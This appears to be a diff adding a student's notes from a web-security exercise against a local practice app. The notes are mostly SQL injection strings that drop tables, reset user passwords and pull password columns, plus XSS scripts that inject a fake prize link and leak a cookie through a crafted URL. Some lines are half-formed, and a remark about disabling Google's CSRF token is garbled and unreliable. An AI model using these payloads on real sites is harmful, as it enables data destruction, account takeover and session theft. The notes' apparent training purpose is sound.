@@ -1,0 +1,42 @@
+to get a syntax error into the database.  This will prevent the call for posts from working.  Shutdown:
+    'e'; Select * from users (username)
+    divide by 0 ??????
+
+to drop a table.  Enter in username:
+     username'; DROP TABLE posts;
+
+
+
+     username'; SELECT id FROM users WHERE id = 1;
+     username'; SELECT count FROM users;
+     username'; UPDATE users SET password = 1111 WHERE id = 1
+     username; UPDATE users SET password = 1234 WHERE id = 1
+
+     '"Bret"' UNION SELECT password FROM users--
+     'Bret' UNION UPDATE users SET password = 9999 where id = 1--
+     'Bret' UPDATE users SET password = 9999 where id = 1--
+
+
+-----------------------------------------------------------------------------------------------
+
+
+
+SQL injection:
+    -Drop table
+    -Ruin the db 
+
+
+XSS:
+    -set a cookie
+    -set an img tag to send cookie elsewhere
+    -in another server (express app), recieve and display cookie
+
+<script>document.write("<h1><a href='https://www.example.com/'>Click here for a free ipod</a></h1>"); window.alert('you won!!')</script>
+
+
+Google has a default csrf token, but that can be disabled by iterating through the cookie object and selecting a particular one.
+Paste this into the post body:
+    <script>let baseUrl = 'http://127.0.0.1:5000/'; document.cookie = "bankInfo=momoney"; let decodedCookie = decodeURIComponent(document.cookie); let cookieArr = decodedCookie.split(';')[1]; let finalCookie = cookieArr.split("=")[1]; let complete = `${baseUrl}${finalCookie}`; console.log(complete); document.write(`<h1><a href=${complete}>Click here for a free ipod</a></h1>`)</script>
+The contents of the cookie will be displayed on the website
+
+
